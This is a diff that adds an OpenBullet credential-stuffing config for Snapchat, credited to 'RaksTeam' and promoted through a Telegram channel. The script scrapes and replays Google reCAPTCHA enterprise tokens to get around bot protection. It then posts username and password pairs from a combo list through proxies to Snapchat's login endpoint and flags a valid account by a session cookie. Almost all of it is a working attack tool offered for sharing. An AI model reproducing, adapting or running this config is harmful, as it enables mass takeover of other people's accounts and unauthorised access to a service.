@@ -1,0 +1,120 @@
+[SETTINGS]
+{
+  "Name": "SnapChat [Configs By RaksTeam]",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2021-06-04T16:05:57.5632382+05:30",
+  "AdditionalInfo": "AdditionalInfo\": \"SnapChat Openbullet Config By RaksTeam | Combo : U:P | Proxy : UHQ | Telegram : @RaksTeam\"",
+  "Author": "𝙉𝘼𝙎𝙀𝙀𝙈 (RaksTeam)",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+!===================================
+!Read me: 
+! Don't forget the credit of config
+! Share with Credit
+! Telegram Channel : @RaksTeam
+!===================================
+
+#Get_Token REQUEST GET "https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6LezjdAZAAAAAD1FaW81QpkkplPNzCNnIOU5anHw&co=aHR0cHM6Ly9hY2NvdW50cy5zbmFwY2hhdC5jb206NDQz&hl=en&v=mrdLhN7MywkJAAbzddTIjTaM&size=invisible&badge=inline&cb=sa3jwjar9kx1" 
+  
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#recaptcha-token PARSE "<SOURCE>" CSS "#recaptcha-token" "value" -> VAR "recaptcha-token" 
+
+#Post_Token REQUEST POST "https://www.google.com/recaptcha/api2/reload?k=6LezjdAZAAAAAD1FaW81QpkkplPNzCNnIOU5anHw" 
+  CONTENT "c=<recaptcha-token>&reason=q&k=6LezjdAZAAAAAD1FaW81QpkkplPNzCNnIOU5anHw&co=aHR0cHM6Ly9hY2NvdW50cy5zbmFwY2hhdC5jb206NDQz&hl=en&v=mrdLhN7MywkJAAbzddTIjTaM&size=invisible&badge=inline&cb=sa3jwjar9kx1" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "origin: https://www.google.com" 
+  HEADER "referer: <ADDRESS>" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36" 
+
+#rresp PARSE "<SOURCE>" LR "[\"rresp\",\"" "\"," -> VAR "rresp" 
+
+REQUEST GET "https://accounts.snapchat.com/accounts/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#xsrf PARSE "<SOURCE>" LR "login-root\" data-xsrf=\"" "\"" -> VAR "xsrf" 
+
+#WW PARSE "<COOKIES(web_client_id)>" LR "" "" -> VAR "WW" 
+
+REQUEST POST "https://accounts.snapchat.com/accounts/login" 
+  CONTENT "username=<USER>&password=<PASS>&xsrf_token=<xsrf>&continue=https%3A%2F%2Faccounts.snapchat.com%2Faccounts%2Fwelcome&g-recaptcha-response=<rresp>&g-recaptcha-response=<rresp>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "origin: https://accounts.snapchat.com" 
+  HEADER "referer: https://accounts.snapchat.com/" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "sec-gpc: 1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36" 
+  HEADER "cookie: xsrf_token=<xsrf>; web_client_id=<WW>; sc-cookies-accepted=true; Preferences=true; Performance=true; Marketing=true" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Cannot find the user" 
+    KEY "That&#39;s not the right password" 
+    KEY "Bad request, please refresh and try again" 
+  KEYCHAIN Success OR 
+    KEY "<COOKIES{*}>" Contains "sc-a-csrf" 
+
+FUNCTION Constant "@Naseem0348" -> CAP "Config Developed By" 
+
+!===================================
+!Read me: 
+! Don't forget the credit of config
+! Share with Credit
+! Telegram Channel : @RaksTeam
+!===================================
+
